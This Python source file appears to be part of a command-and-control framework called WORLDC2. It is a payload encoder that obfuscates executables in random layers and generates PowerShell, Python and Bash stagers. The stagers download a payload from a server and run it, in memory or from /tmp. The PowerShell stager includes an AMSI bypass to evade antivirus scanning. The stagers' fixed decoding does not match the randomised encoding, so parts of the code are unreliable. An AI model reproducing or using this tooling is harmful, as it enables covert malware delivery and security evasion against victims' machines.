#!/usr/bin/env python3
"""
WORLDC2 C2 - Payload Encoder
Encodes payloads with multiple layers of obfuscation for delivery.

Uso:
    python3 encoder.py --input payload.exe --output encoded.bin --layers 3
    python3 encoder.py --input payload.exe --stager ps1 --output stager.ps1
"""

import os, sys, argparse, base64, struct, random
from pathlib import Path

GREEN = "\033[92m"; BLUE = "\033[94m"; YELLOW = "\033[93m"
RED = "\033[91m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def add_junk(data, min_junk=100, max_junk=500):
    junk = os.urandom(random.randint(min_junk, max_junk))
    pos = random.randint(0, len(data))
    return data[:pos] + junk + data[pos:]

def chunk_data(data, chunk_size=256):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

def encode_layers(data, layers=3):
    """Apply multiple encoding layers."""
    result = data
    encoding_chain = []

    for i in range(layers):
        method = random.choice(['xor', 'base64', 'reverse', 'shuffle'])
        encoding_chain.append(method)

        if method == 'xor':
            key = os.urandom(random.randint(8, 32))
            result = xor_encrypt(result, key)
            result = key + result  # Prepend key
        elif method == 'base64':
            result = base64.b64encode(result)
        elif method == 'reverse':
            result = result[::-1]
        elif method == 'shuffle':
            chunks = chunk_data(result, 64)
            random.shuffle(chunks)
            result = b''.join(chunks)

        # Add junk data
        result = add_junk(result)

    return result, encoding_chain

def generate_ps1_stager(encoded_data, url):
    """Generate PowerShell stager that downloads and decodes payload."""
    b64 = base64.b64encode(encoded_data).decode()

    stager = f'''# WORLDC2 Encoded Payload Stager
$u="{url}"
try{{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}}
$d=[Convert]::FromBase64String("{b64[:100]}...")
# Download and decode
$wc=New-Object Net.WebClient
$raw=$wc.DownloadData($u)
# Decode layers
$data=$raw
# Layer 1: Remove junk
$data=$data[100..($data.Length-1)]
# Layer 2: Reverse
[array]::Reverse($data)
# Layer 3: XOR with key
$key=$data[0..31]
$data=$data[32..($data.Length-1)]
for($i=0;$i-lt$data.Length;$i++){{$data[$i]=$data[$i]-bxor$key[$i%$key.Length]}}
# Execute in memory
$asm=[System.Reflection.Assembly]::Load($data)
$entry=$asm.EntryPoint
$entry.Invoke($null,@(, @()))
'''
    return stager

def generate_python_stager(encoded_data, url):
    """Generate Python stager."""
    stager = f'''import urllib.request,os,tempfile,subprocess
u="{url}"
d=urllib.request.urlopen(u).read()
# Decode layers
data=d[100:]
data=data[::-1]
key=data[:32]
data=data[32:]
data=bytearray(data)
for i in range(len(data)):data[i]^=key[i%32]
p=os.path.join(tempfile.gettempdir(),os.urandom(8).hex())
open(p,'wb').write(data)
os.chmod(p,0o755)
subprocess.Popen([p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
'''
    return stager

def generate_bash_stager(encoded_data, url):
    """Generate Bash stager."""
    stager = f'''#!/bin/bash
u="{url}"
f=/tmp/.$RANDOM
curl -s "$u" -o "$f" 2>/dev/null||wget -qO "$f" "$u" 2>/dev/null
python3 -c "
import os
d=open('$f','rb').read()[100:][::-1]
k=d[:32];d=d[32:]
d=bytearray(d)
for i in range(len(d)):d[i]^=k[i%32]
p='/tmp/'+os.urandom(8).hex()
open(p,'wb').write(d);os.chmod(p,0o755)
os.execv(p,[p])
" 2>/dev/null
'''
    return stager

def main():
    p = argparse.ArgumentParser(description="WORLDC2 Payload Encoder")
    p.add_argument("--input", "-i", required=True, help="Input payload file")
    p.add_argument("--output", "-o", help="Output file")
    p.add_argument("--layers", "-l", type=int, default=3, help="Encoding layers (1-5)")
    p.add_argument("--stager", "-s", choices=["ps1", "python", "bash"], help="Generate stager")
    p.add_argument("--url", "-u", help="Stager download URL")
    args = p.parse_args()

    input_path = Path(args.input)
    if not input_path.exists():
        print(f"{RED}[✗]{RESET} Input file not found: {input_path}")
        sys.exit(1)

    data = input_path.read_bytes()
    print(f"{BOLD}{CYAN}WORLDC2 Payload Encoder{RESET}")
    print(f"  Input:  {input_path.name} ({len(data):,} bytes)")
    print(f"  Layers: {args.layers}\n")

    # Encode
    encoded, chain = encode_layers(data, args.layers)
    print(f"{BLUE}[>]{RESET} Encoding chain: {' → '.join(chain)}")
    print(f"{GREEN}[✓]{RESET} Encoded size: {len(encoded):,} bytes ({len(encoded)/len(data):.1f}x)\n")

    if args.stager:
        url = args.url or "http://<server>/payload.bin"
        if args.stager == "ps1":
            output = generate_ps1_stager(encoded, url)
        elif args.stager == "python":
            output = generate_python_stager(encoded, url)
        elif args.stager == "bash":
            output = generate_bash_stager(encoded, url)

        out_path = Path(args.output or f"stager.{args.stager}")
        out_path.write_text(output)
        print(f"{GREEN}[✓]{RESET} Stager: {out_path.name} ({len(output)} bytes)")
    else:
        out_path = Path(args.output or "encoded.bin")
        out_path.write_bytes(encoded)
        print(f"{GREEN}[✓]{RESET} Encoded payload: {out_path.name} ({len(encoded):,} bytes)")

    print(f"\n{YELLOW}Delivery:{RESET} Host encoded payload on web server")
    print(f"  python3 -m http.server 8000 --directory {out_path.parent}")


if __name__ == "__main__":
    main()
